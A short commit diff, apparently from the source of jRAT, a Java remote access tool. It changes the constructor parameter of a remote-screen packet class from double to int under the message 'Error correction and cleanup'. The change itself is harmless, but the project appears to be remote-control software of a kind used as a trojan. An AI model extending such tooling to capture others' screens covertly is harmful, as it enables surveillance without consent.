Error correction and cleanup

+++ Client/src/pro/jrat/client/packets/outgoing/Packet13OneRemoteScreen.java
@@ -2,7 +2,7 @@ package pro.jrat.client.packets.outgoing;
 
 public class Packet13OneRemoteScreen extends Packet12RemoteScreen {
 
-	public Packet13OneRemoteScreen(double size, int quality, int monitor) {
+	public Packet13OneRemoteScreen(int size, int quality, int monitor) {
 		super(size, quality, monitor);
 	}
